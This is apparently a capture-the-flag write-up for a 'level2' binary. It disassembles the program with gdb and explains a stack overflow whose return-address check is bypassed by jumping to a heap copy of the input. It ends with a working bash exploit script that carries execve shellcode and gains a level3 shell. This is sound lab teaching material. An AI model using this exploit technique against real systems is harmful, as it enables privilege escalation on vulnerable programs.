<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level1](../level1/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[level3 →](../level3/solution.md)
</span>
</span>

level2
======

Dissassembly
------------

To dissassemble the executable we can use gdb.
```sh
FUNCTION=main EXECUTABLE=./level2
gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble/r $FUNCTION" "$EXECUTABLE"
```

The main function looks like this:
```nasm
Dump of assembler code for function main:
   0x0804853f <+0>:  push  ebp
   0x08048540 <+1>:  mov   ebp,esp
   0x08048542 <+3>:  and   esp,0xfffffff0
   0x08048545 <+6>:  call  0x80484d4 <p>
   0x0804854a <+11>: leave
   0x0804854b <+12>: ret
End of assembler dump.
```

It calls another function p:
```sh
FUNCTION=p EXECUTABLE=./level2
gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble/r $FUNCTION" "$EXECUTABLE"
```

```nasm
Dump of assembler code for function p:
   0x080484d4 <+0>:     55                   push  ebp
   0x080484d5 <+1>:     89 e5                mov   ebp,esp
   0x080484d7 <+3>:     83 ec 68             sub   esp,0x68
   0x080484da <+6>:     a1 60 98 04 08       mov   eax,ds:0x8049860
   0x080484df <+11>:    89 04 24             mov   DWORD PTR [esp],eax
   0x080484e2 <+14>:    e8 c9 fe ff ff       call  0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    8d 45 b4             lea   eax,[ebp-0x4c]
   0x080484ea <+22>:    89 04 24             mov   DWORD PTR [esp],eax
   0x080484ed <+25>:    e8 ce fe ff ff       call  0x80483c0 <gets@plt>
   0x080484f2 <+30>:    8b 45 04             mov   eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:    89 45 f4             mov   DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:    8b 45 f4             mov   eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:    25 00 00 00 b0       and   eax,0xb0000000
   0x08048500 <+44>:    3d 00 00 00 b0       cmp   eax,0xb0000000
   0x08048505 <+49>:    75 20                jne   0x8048527 <p+83>
   0x08048507 <+51>:    b8 20 86 04 08       mov   eax,0x8048620
   0x0804850c <+56>:    8b 55 f4             mov   edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:    89 54 24 04          mov   DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:    89 04 24             mov   DWORD PTR [esp],eax
   0x08048516 <+66>:    e8 85 fe ff ff       call  0x80483a0 <printf@plt>
   0x0804851b <+71>:    c7 04 24 01 00 00 00 mov   DWORD PTR [esp],0x1
   0x08048522 <+78>:    e8 a9 fe ff ff       call  0x80483d0 <_exit@plt>
   0x08048527 <+83>:    8d 45 b4             lea   eax,[ebp-0x4c]
   0x0804852a <+86>:    89 04 24             mov   DWORD PTR [esp],eax
   0x0804852d <+89>:    e8 be fe ff ff       call  0x80483f0 <puts@plt>
   0x08048532 <+94>:    8d 45 b4             lea   eax,[ebp-0x4c]
   0x08048535 <+97>:    89 04 24             mov   DWORD PTR [esp],eax
   0x08048538 <+100>:   e8 a3 fe ff ff       call  0x80483e0 <strdup@plt>
   0x0804853d <+105>:   c9 leave
   0x0804853e <+106>:   c3 ret
End of assembler dump.
```

The stack looks like this:
| Address | Type          | Size |
|---------|---------------|------|
| -0x4c   | char data[76] | 76   |
|  0x00   | *EBP          |  4   |
|  0x04   | *EIP          |  4   |

Exploitation
------------

This is another stack-buffer overflow. This means we can overwrite data preceding the buffer on the stack, notably the return pointer preceding the buffer on the stack.

We can override the value of EIP by using 80 bytes of padding, followed by the address we want to jump to.
We could try to jump onto the stack-buffer.

First we need to find out at which address the stack-buffer starts.
```sh
gdb ./level2 -batch -ex 'b * 0x080484f2' -ex 'r <<<ABCD' -ex 'p (char*)$ebp - 0x4c'
```
```
Breakpoint 1 at 0x80484f2

Breakpoint 1, 0x080484f2 in p ()
$1 = 0xbffff6ec "ABCD"
```

```sh
ADDRESS="bffff6ec"
BYTES=$(<<< "$ADDRESS" rev | dd conv=swab | xxd -r -p)
(printf '%.0sA' {1..80}; echo $BYTES) | ./level2
```
```
(0xbffff6ec)
```

Oh no, it looks like we where caught!
```nasm
...
   0x080484f2 <+30>:    8b 45 04             mov   eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:    89 45 f4             mov   DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:    8b 45 f4             mov   eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:    25 00 00 00 b0       and   eax,0xb0000000
   0x08048500 <+44>:    3d 00 00 00 b0       cmp   eax,0xb0000000
   0x08048505 <+49>:    75 20                jne   0x8048527 <p+83>
   0x08048507 <+51>:    b8 20 86 04 08       mov   eax,0x8048620
   0x0804850c <+56>:    8b 55 f4             mov   edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:    89 54 24 04          mov   DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:    89 04 24             mov   DWORD PTR [esp],eax
   0x08048516 <+66>:    e8 85 fe ff ff       call  0x80483a0 <printf@plt>
   0x0804851b <+71>:    c7 04 24 01 00 00 00 mov   DWORD PTR [esp],0x1
   0x08048522 <+78>:    e8 a9 fe ff ff       call  0x80483d0 <_exit@plt>
   0x08048527 <+83>:    8d 45 b4             lea   eax,[ebp-0x4c]
...
```

Upon closer inspection, we can see that the stored value of the EIP (EBP + 4) is checked and the program exits if it is above 0xb0000000.
So we cannot jump onto our stack-buffer.

But we can also see that our input is being duplicated into an unfreed heap-allocated buffer, before the function returns.
```nasm
...
   0x08048527 <+83>:    8d 45 b4             lea   eax,[ebp-0x4c]
   0x0804852a <+86>:    89 04 24             mov   DWORD PTR [esp],eax
   0x0804852d <+89>:    e8 be fe ff ff       call  0x80483f0 <puts@plt>
   0x08048532 <+94>:    8d 45 b4             lea   eax,[ebp-0x4c]
   0x08048535 <+97>:    89 04 24             mov   DWORD PTR [esp],eax
   0x08048538 <+100>:   e8 a3 fe ff ff       call  0x80483e0 <strdup@plt>
   0x0804853d <+105>:   c9 leave
   0x0804853e <+106>:   c3 ret
End of assembler dump.
```

If we find out it's address we can jump onto it instead of the stack-buffer, and bypass the stack-check.
```sh
gdb ./level2 -batch -ex 'b * 0x0804853e' -ex 'r <<<ABCD' -ex 'p (char*)$eax'
```
```
Breakpoint 1 at 0x804853e
ABCD

Breakpoint 1, 0x0804853e in p ()
$1 = 0x804a008 "ABCD
```

Perfect, now all that's left to do is to place some shellcode at the start of the buffer.

I'll use [Geyslan G. Bem's tiny shellcode](http://shell-storm.org/shellcode/files/shellcode-841.php):


```sh
> /tmp/level2.sh cat << EOF
```
```bash
#!/usr/bin/env bash
RETURN_ADDRESS=0804a008
SIZE=80
SHELLCODE=$'\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

LC_ALL=C # Count bytes instead of graphemes
BYTES=$(<<< "$RETURN_ADDRESS" rev | dd conv=swab | xxd -r -p)

PADDING_SIZE=$((SIZE-${#SHELLCODE}))
PADDING=$(printf '%.0sA' $(seq -s' ' "$PADDING_SIZE"))

echo "$SHELLCODE$PADDING$BYTES"
```
```sh
EOF
chmod +x shellcode.sh
```

```sh
(/tmp/level2.sh; cat) | ./level2
```
```
1É÷á°
     Qh//shh/binã̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
whoami
level3
```
